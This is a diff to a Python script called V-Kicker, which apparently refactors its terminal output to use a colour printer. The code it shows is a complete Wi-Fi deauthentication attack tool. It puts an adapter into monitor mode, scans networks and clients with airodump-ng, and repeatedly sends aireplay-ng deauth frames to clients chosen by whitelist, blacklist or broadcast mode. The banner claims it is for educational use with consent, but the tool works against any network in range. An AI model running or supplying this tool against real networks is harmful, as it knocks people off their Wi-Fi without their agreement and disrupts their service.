@@ -1,11 +1,10 @@
-import curses
 import datetime
 import os
 import signal
 import subprocess
 import sys
-from threading import Thread
 import time
+from printer import Printer
 
 # ---[ CLASSES ]--- #
 
@@ -38,6 +37,7 @@ choosen_adapter = None
 
 # List of Network objects
 networks = []
+last_network_count = -1
 
 # Choosen network
 choosen_network = None
@@ -55,18 +55,13 @@ black_listed = []
 def is_root():
     return os.geteuid() == 0
 
-def show_error(message):
-    print("[x]: " + message)
-
-def show_message(message):
-    print("[!]: " + message)
-
 def show_time(message):
     now = datetime.datetime.now()
-    print(f"[{now.hour:02d}:{now.minute:02d}:{now.second:02d}]: {message}")
+    Printer.writeline(" {W}[{G}" + f"{now.hour:02d}" + "{W}:{G}" + f"{now.minute:02d}" + "{W}:{G}" + f"{now.second:02d}" + "{W}] " + f"{message}")
 
 def show_question(msg):
-    return input("[?]: " + msg + " ")
+    Printer.write("{?} " + msg + " ")
+    return input()
 
 def has_monitor_adapter():
     for adapter in adapters:
@@ -86,64 +81,65 @@ def reset_variables():
     networks.clear()
 
 def show_header():                      
-    print("                                                                            ")
-    print("                                 *@@@@@@(                                   ")
-    print("                        %@@@@@@@@@@@@@                                      ")
-    print("                   @@@@@@@@@@@@@@@@                                         ")
-    print("                @@@@@@@@@@@@@@@@                      @@@@@@(               ")
-    print("             .@@@@@@@@@@@@@@@&                   *@@@@@@@@@@@@@             ")
-    print("            @@@@@@@@@@@@@@@                  @@@@@@@@@@@@@@@@@@@            ")
-    print("           @@@@@@@@@@@@@       #@                  %@@@@@@@@@@@@@           ")
-    print("           @@@@@@@@@@@@@@@@@@                (@@@@@@@@@@@@@@@@@@@           ")
-    print("           @@@@@@@@@@@@@@@             *@@@@@@@@@@@@@@@@@@@@@@@@@           ")
-    print("           @@@@@@@@@@@           *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ")
-    print("            @@@@@@,         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.           ")
-    print("            %@@      ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            ")
-    print("                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             ")
-    print("              @@@@@@&*   ./&@@@@@@@@@@@@@@@@@@@@@(.   ,#@@@@@@              ")
-    print("              @@@@@         (@@@@@@@@@@@@@@@@@@@         ,@@@@              ")
-    print("              @@@@@              @@@@@@@@@@               /@@@@              ")
-    print("              @@@@@               @@@@@@@@               @@@@@              ")
-    print("              @@@@@@             @@@@@@@@@@%            @@@@@@(             ")
-    print("              @@@@@@@@       @@@@@@@@@@@@@@@@@@       @@@@@@@@&             ")
-    print("              @@@@@@@@@@@@@@@@@@@@@@,   @@@@@@@@@@@@@@@@@@@@@@%             ")
-    print("              @@@@@@@@@@@@@@@@@@@@*       @@@@@@@@@@@@@@@@@@@@              ")
-    print("               @@@@@@@@@@@@@@@@@@@/   @   @@@@@@@@@@@@@@@@@@@               ")
-    print("                 .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 ")
-    print("                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     ")
-    print("                          @@@@@@@@@@@@@@@@@@@@@@@@.                         ")
-    print("                           @@@@@@@@@@@@@@@@@@@@@@                           ")
-    print("                             @  @@@(@@@@(@@@  @@                            ")
-    print("                                 @   (@   @                                 ")
-    print("                                                                            ")
-    print("                                                                            ")
-    print("                             ++++++++++++++++++                             ")
-    print("                                  V-Kicker                                  ")
-    print("                             ++++++++++++++++++                             ")
-    print("                                                                            ")
-    print("  Educational use only. Use this tool only with everyone involved consent.  ")
-    print("                                                                            ")
+    Printer.writeline("{C}                                                                            ")
+    Printer.writeline("{C}                                 *@@@@@@(                                   ")
+    Printer.writeline("{C}                        %@@@@@@@@@@@@@                                      ")
+    Printer.writeline("{C}                   @@@@@@@@@@@@@@@@                                         ")
+    Printer.writeline("{C}                @@@@@@@@@@@@@@@@                      @@@@@@(               ")
+    Printer.writeline("{C}             .@@@@@@@@@@@@@@@&                   *@@@@@@@@@@@@@             ")
+    Printer.writeline("{C}            @@@@@@@@@@@@@@@                  @@@@@@@@@@@@@@@@@@@            ")
+    Printer.writeline("{C}           @@@@@@@@@@@@@       #@                  %@@@@@@@@@@@@@           ")
+    Printer.writeline("{C}           @@@@@@@@@@@@@@@@@@                (@@@@@@@@@@@@@@@@@@@           ")
+    Printer.writeline("{C}           @@@@@@@@@@@@@@@             *@@@@@@@@@@@@@@@@@@@@@@@@@           ")
+    Printer.writeline("{C}           @@@@@@@@@@@           *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@           ")
+    Printer.writeline("{C}            @@@@@@,         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.           ")
+    Printer.writeline("{C}            %@@      ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@            ")
+    Printer.writeline("{C}                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@             ")
+    Printer.writeline("{C}              @@@@@@@@{Y}***{C}@@&@@@@@@@@@@@@@@@@@@@@@@@{Y}***{C}@@@@@@@@              ")
+    Printer.writeline("{C}              @@@@@{Y}*********{C}@@@@@@@@@@@@@@@@@@@@{Y}*********{C}@@@@@              ")
+    Printer.writeline("{C}              @@@@@{Y}**************{C}@@@@@@@@@@{Y}***************{C}@@@@              ")
+    Printer.writeline("{C}              @@@@@{Y}***************{C}@@@@@@@@{Y}***************{C}@@@@@              ")
+    Printer.writeline("{C}              @@@@@@{Y}*************{C}@@@@@@@@@@@{Y}************{C}@@@@@@(             ")
+    Printer.writeline("{C}              @@@@@@@@{Y}*******{C}@@@@@@@@@@@@@@@@@@{Y}*******{C}@@@@@@@@&             ")
+    Printer.writeline("{C}              @@@@@@@@@@@@@@@@@@@@@@@{R}###{C}@@@@@@@@@@@@@@@@@@@@@@%             ")
+    Printer.writeline("{C}              @@@@@@@@@@@@@@@@@@@@@{R}#######{C}@@@@@@@@@@@@@@@@@@@@              ")
+    Printer.writeline("{C}               @@@@@@@@@@@@@@@@@@@@{R}###{C}@{R}###{C}@@@@@@@@@@@@@@@@@@@               ")
+    Printer.writeline("{C}                 .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                 ")
+    Printer.writeline("{C}                     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                     ")
+    Printer.writeline("{C}                          @@@@@@@@@@@@@@@@@@@@@@@@.                         ")
+    Printer.writeline("{C}                           @@@@@@@@@@@@@@@@@@@@@@                           ")
+    Printer.writeline("{C}                             @  @@@(@@@@(@@@  @@                            ")
+    Printer.writeline("{C}                                 @   (@   @                                 ")
+    Printer.writeline("{C}                                                                            ")
+    Printer.writeline("{C}                                                                            ")
+    Printer.writeline("{C}                             {B}++++++++++++++++++                             ")
+    Printer.writeline("{C}                             {B}+    {Y}V-Kicker    {B}+                              ")
+    Printer.writeline("{C}                             {B}++++++++++++++++++                             ")
+    Printer.writeline("{C}                                                                            ")
+    Printer.writeline("  {Y}Educational {R}use only. Use this tool {Y}only {R}with everyone involved {Y}consent.  ")
+    Printer.writeline("                                                                            ")
 
 def check_dependencies():
     if (is_root() == False):
-        show_error("Run this script with sudo to continue.")
+        Printer.writeline("{x} run this scripts as {R}sudo {Y}to continue.")
         sys.exit(1)
 
 def find_adapters():
-    show_message("Searching for adapters.")
+    Printer.writeline("{!} searching for {G}wlan {W}adapters.")
 
     adapters.clear()
 
-    cmd = subprocess.run("ifconfig | grep wlan", shell = True, stdout = subprocess.PIPE)
+    cmd = subprocess.run("ifconfig -a | grep wlan", shell = True, stdout = subprocess.PIPE)
     
     try:
         lines = cmd.stdout.decode("utf8").splitlines()
     except:
-        show_error("Error while getting wlan adapters.")
+        Printer.writeline("{x} error while getting {R}wlan {Y}adapters.")
         sys.exit(1)
 
     if len(lines) == 0:
-        show_error("No wlan interfaces found.")
+
+        Printer.writeline("{x} no {R}wlan {Y}adapters found.")
         sys.exit(1)
         
     for line in lines:
@@ -151,6 +147,7 @@ def find_adapters():
         iEnd = line.find(":")
         interface = line[iStart:iEnd - iStart]
 
+        # TODO: find a better way to check if it is monitor
         adapter = Adapter(interface, "mon" in line)
         adapters.append(adapter)
 
@@ -162,32 +159,32 @@ def choose_adapter():
     elif len(adapters) == 1:
         choosen_adapter = adapters[0]
     elif len(adapters) == 0:
-        show_error("No adapters found.")
+        Printer.writeline("{x} no {R}adapters {Y}found.")
     else:
-        show_message("Available adapters:")
-        print("")
+        Printer.writeline("{!} available {G}adapters{W}:")
+        Printer.writeline("")
 
         for i, adapter in enumerate(adapters):
-            print(" " + str(i) + ") " + adapter.name)
+            Printer.writeline("  {G}" + str(i) +"{W}) {Y}" + adapter.name + "{W}")
 
-        print("")
+        Printer.writeline("")
 
         # TODO: check for int()
-        iAdapter = int(show_question("Which adapter do you want to use?"))
+        iAdapter = int(show_question("choose an {Y}adapter {W} to use:"))
         choosen_adapter = adapters[iAdapter]
     
-    show_message("Adapter " + choosen_adapter.name + " choosen.")
+    Printer.writeline("{!} adapter {G}" + choosen_adapter.name + "{W} choosen.")
 
 def airmon_check_kill():
-    show_message("Killing processes that uses " + choosen_adapter.name + " adapter.")
+    Printer.writeline("{!} killing processes on {G}" + choosen_adapter.name + "{W} adapter.")
     cmd = subprocess.run("airmon-ng check kill", shell = True, stdout = subprocess.PIPE)
 
     if cmd.returncode != 0:
-        show_error("Error while killing processes.")
+        Printer.writeline("{x} error while killing processes on {G}" + choosen_adapter.name + "{W} adapter.")
         sys.exit(1)
 
 def enable_monitor_mode():
-    show_message("Enabling monitor mode for " + choosen_adapter.name + " adapter.")
+    Printer.writeline("{!} enabling monitor mode for {G}" + choosen_adapter.name + "{W} adapter.")
 
     global original_adapter
     original_adapter = Adapter(choosen_adapter.name, choosen_adapter.is_monitor)
@@ -195,13 +192,16 @@ def enable_monitor_mode():
     cmd = subprocess.run("airmon-ng start " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE)
 
     if cmd.returncode != 0:
-        show_error("Error while enabling monitor mode.")
+        Printer.writeline("{x} error while enabling monitor mode for {G}" + choosen_adapter.name + "{W} adapter.")
         sys.exit(1)
 
-    show_message("Monitor mode enabled for " + choosen_adapter.name + " adapter.")
+    Printer.writeline("{!} monitor mode enabled for {G}" + choosen_adapter.name + "{W} adapter.")
 
 def scan_access_points():
-    show_message("Scanning access points using " + choosen_adapter.name + " adapter.")
+    Printer.writeline("{!} scanning AP on {G}" + choosen_adapter.name + "{W} adapter.")
+
+    global last_network_count
+    last_network_count = -1
 
     # Launch network scan process
     proc_network_scan = subprocess.Popen("airodump-ng " + choosen_adapter.name + " --write tmp_networks --update 1 --output-format csv --write-interval 1", shell = True, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
@@ -215,14 +215,15 @@ def scan_access_points():
             break
 
     if os.path.exists(os.path.join(__location__, 'tmp_networks-01.csv')) == False:
-        show_error("Unable to obtain networks after 10 attempts.")
+        Printer.writeline("{x} unable to obtain {R}networks {Y}after 10 attempts.")
         sys.exit(1)
 
     try:
-        stdscr = curses.initscr()
-        curses.noecho()
-        curses.cbreak()
-
+        Printer.writeline("{!} available {G}networks{W}:")
+        Printer.writeline(" ")
+        Printer.writeline("{B} NUM                     ESSID    CH  POWER")
+        Printer.writeline("{B} ---  ------------------------  ----  -----")
+        
         while True:
             with open(os.path.join(__location__, 'tmp_networks-01.csv')) as file:
                 lines = [line.rstrip() for line in file]
@@ -244,7 +245,7 @@ def scan_access_points():
 
                 # Check if has found something
                 if i_start < 0 or i_end < 0:
-                    show_error("Unable to parse the file")
+                    Printer.writeline("{x} unable to parse {R}network {Y}file.")
                     sys.exit(1)
 
                 # Clear all networks
@@ -256,64 +257,67 @@ def scan_access_points():
 
                     bssid = network[0].strip()
                     channel = network[3].strip()
-                    power = network[8].strip()
+                    power = int(network[8].strip("").replace("-", ""))
                     essid = network[13].strip()
 
                     n = Network(bssid, channel, power, essid)
                     networks.append(n)    
                 
                 # Print networks
-                try:
-                    stdscr.addstr(0, 0, "[!] Available networks:")
-                    stdscr.addstr(1, 0, " ")
+                if last_network_count >= 0:
+                    Printer.go_up(last_network_count + 2)
 
-                    for i, network in enumerate(networks):
-                        stdscr.addstr(i + 2, 0, "==> [" + network.bssid + "] - " + network.essid + " - CH" + network.channel + " - PW" + network.power)
+                for i, network in enumerate(networks):
+                    if last_network_count >= 0:
+                        Printer.clear_line()
 
-                    stdscr.addstr(len(networks) + 2, 0, " ")
-                    stdscr.addstr(len(networks) + 3, 0, "[!] Use CTRL + C to stop scanning.")
-                except Exception as e:
-                    show_error("Exception " + e)
+                    essid = network.essid if len(network.essid) <= 24 else network.essid[:21] + "..."
+                    essid = essid if len(essid) > 0 else "<" + network.bssid + ">"
 
-                stdscr.refresh()
+                    if network.power > 50:
+                        power_color = "{G}"
+                    elif network.power > 35:
+                        power_color = "{Y}"
+                    else:
+                        power_color = "{R}"
+
+                    Printer.write(" {G}"+ str(i).rjust(3) + " ")
+                    Printer.write(" {W}"+ essid.rjust(24) + " ")
+                    Printer.write(" {Y}"+ network.channel.rjust(4) + " ")
+                    Printer.write(" " + power_color + (str(network.power) + "db").rjust(5) + "\n")
+
+                Printer.clear_line()
+                Printer.writeline(" ")
+                Printer.clear_line()
+                Printer.writeline("{!} use {Y}CTRL {W}+ {Y}C {W}to stop scanning.")
+
+                last_network_count = len(networks)
                 time.sleep(1)
 
     except KeyboardInterrupt:
-        curses.echo()
-        curses.nocbreak()
-        curses.endwin()
-
         os.kill(proc_network_scan.pid, signal.SIGKILL)
 
-        show_message("Available networks:")
-        print(" ")
-
-        for i, network in enumerate(networks):
-            print(" " + str(i) + ") [" + network.bssid + "] - CH" + network.channel + " - PW" + network.power + " - " + network.essid)
-        
-        print(" ")
-
-        choosen_i_network = show_question("Choose a network:")
+        choosen_i_network = show_question("choose a {Y}network{W}:")
 
         global choosen_network
         choosen_network = networks[int(choosen_i_network)]
 
-        show_message("Network " + choosen_network.essid + " choosen.")
+        Printer.writeline("{!} network {G}" + choosen_network.essid + "{W} choosen.")
 
 def choose_mode():
-    show_message("Available modes:")
-    print(" ")
-    print(" 0) Whitelist only.")
-    print(" 1) Blacklist kicker.")
-    print(" 2) All clients.")
-    print(" ")
+    Printer.writeline("{!} avaiable {G}modes{W}:")
+    Printer.writeline("")
+    Printer.writeline("  {G}0{W}) {Y}Whitelist{W}: kick everyone except for whitelisted clients.")
+    Printer.writeline("  {G}1{W}) {Y}Blacklist{W}: kick only blacklisted clients.")
+    Printer.writeline("  {G}2{W}) {Y}Broadcast{W}: kick everyone.")
+    Printer.writeline("")
 
     global choosen_mode
-    choosen_mode = show_question("Which mode do you want to use?")
+    choosen_mode = show_question("choose a {Y}mode{W}:")
 
 def kicker():
-    show_message("Initializing kicker.")
-    print("")
+    Printer.writeline("{!} initializing kicker.")
+    Printer.writeline("")
 
     # Launch client scan process
     proc_client_scan = subprocess.Popen("airodump-ng --channel " + choosen_network.channel + " --bssid " + choosen_network.bssid + " " + choosen_adapter.name + " --write tmp_clients --update 1 --output-format csv --write-interval 1", shell = True, stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
@@ -327,7 +331,7 @@ def kicker():
             break
 
     if os.path.exists(os.path.join(__location__, 'tmp_clients-01.csv')) == False:
-        show_error("Unable to obtain clients after 10 attempts.")
+        Printer.writeline("{x} unable to obtain {R}clients {Y}after 10 attempts.")
         sys.exit(1)
 
     # Whitelist
@@ -341,7 +345,9 @@ def kicker():
                     
                 white_listed.append(line.strip())
 
-                show_message(line.strip() + " added to whitelist.")
+                Printer.writeline("{!} client {G}" + line.strip() + " {W}added to whitelist.")
+            
+            Printer.writeline("")
     # Blacklist
     elif choosen_mode == "1" and os.path.exists(os.path.join(__location__, '_BLACKLIST.txt')):
         with open(os.path.join(__location__, '_BLACKLIST.txt')) as file:
@@ -353,7 +359,9 @@ def kicker():
                     
                 black_listed.append(line.strip())
 
-                show_message(line.strip() + " added to blacklist.")
+                Printer.writeline("{!} client {G}" + line.strip() + " {W}added to blacklist.")
+            
+            Printer.writeline("")
     try:
         while True:
             with open(os.path.join(__location__, 'tmp_clients-01.csv')) as file:
@@ -373,7 +381,7 @@ def kicker():
 
                 # Check if has found something
                 if i_start < 0:
-                    show_error("Unable to parse the file")
+                    Printer.writeline("{x} unable to parse {R}clients {Y}file.")
                     sys.exit(1)
 
                 # Clear all clients
@@ -392,36 +400,36 @@ def kicker():
                 # Do magic
                 for splitted_client in clients:
                     if choosen_mode == "0" and splitted_client.mac in white_listed:
-                        show_time("Ignoring " + splitted_client.mac + " thanks to whitelist.")
+                        show_time("{G}ignored {W}client {Y}" + splitted_client.mac + " {W}thanks to {Y}whitelist{W}.")
                     elif choosen_mode == "1" and splitted_client.mac in black_listed:
                         subprocess.Popen("aireplay-ng --deauth 10 -a " + choosen_network.bssid + " -c " + splitted_client.mac + " " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-                        show_time("Sent deauth to " + splitted_client.mac + " thanks to blacklist.")
+                        show_time("{R}deauth {W}sent to {Y}" + splitted_client.mac + " {W}thanks to {Y}blacklist{W}.")
                     else:
                         subprocess.Popen("aireplay-ng --deauth 10 -a " + choosen_network.bssid + " -c " + splitted_client.mac + " " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
-                        show_time("Sent deauth to " + splitted_client.mac + ".")
+                        show_time("{R}deauth {W}sent to {Y}" + splitted_client.mac + "{W}.")
 
-                show_time("Press CTRL + C anytime to quit.")
+                show_time("use {Y}CTRL {W}+ {Y}C {W}to stop kicking.")
                 time.sleep(1)
 
     except KeyboardInterrupt:
         os.kill(proc_client_scan.pid, signal.SIGKILL)
-        show_message("Kicker successfully disabled.")
+        Printer.writeline("")
+        Printer.writeline("{!} kicker {G}successfully {W}disabled.")
 
 def disable_monitor_mode():
-    show_message("Disabling monitor mode for " + choosen_adapter.name + " adapter.")
+    Printer.writeline("{!} disabling monitor mode for {G}" + choosen_adapter.name + " {W}adapter.")
     cmd = subprocess.run("airmon-ng stop " + choosen_adapter.name, shell = True, stdout = subprocess.PIPE)
 
     if cmd.returncode != 0:
-        show_error("Error while enabling monitor mode.")
+        Printer.writeline("{x} error while disabling monitor mode for {G}" + choosen_adapter.name + " {W}adapter.")
         sys.exit(1)
 
-    show_message("Monitor mode disabled for " + choosen_adapter.name + " adapter.")
+    Printer.writeline("{!} monitor mode disabled for {G}" + choosen_adapter.name + " {W}adapter.")
 
 def restore_network_manager():
-    show_message("Re-establishing the network for " + original_adapter.name + " adapter.")
+    Printer.writeline("{!} re-establishing the network for {G}" + original_adapter.name + " {W}adapter.")
     subprocess.run("ifconfig " + original_adapter.name + " up", shell = True, stdout = subprocess.PIPE)
     subprocess.run("service NetworkManager restart", shell = True, stdout = subprocess.PIPE)
-
 
 # ---[ MAIN ]--- #
 
